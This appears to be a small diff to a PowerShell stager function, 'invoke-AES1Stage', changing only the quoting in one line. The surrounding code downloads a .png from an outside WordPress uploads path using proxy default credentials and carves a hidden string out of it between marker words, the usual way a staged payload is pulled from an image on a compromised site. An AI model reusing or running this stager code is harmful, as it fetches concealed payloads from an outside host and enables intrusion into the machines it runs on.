@@ -5,7 +5,7 @@ function invoke-AES1Stage
         $proxy = New-Object System.Net.webproxy
         $request.proxy = $proxy
         $request.usedefaultcredentials = "true"
-        $inputentirestring = $request.Downloadstring('http://www.holidayguru.it/wp-content/uploads/2015/10/polignano_puglia.png')
+        $inputentirestring = $request.Downloadstring("http://www.holidayguru.it/wp-content/uploads/2015/10/polignano_puglia.png")
         [array] $xvalue = ([regex]'wootwoot').split($inputentirestring)
         [array] $yvalue = ([regex]'weetweet').split($xvalue[1])
         $InputString = $yvalue[0]
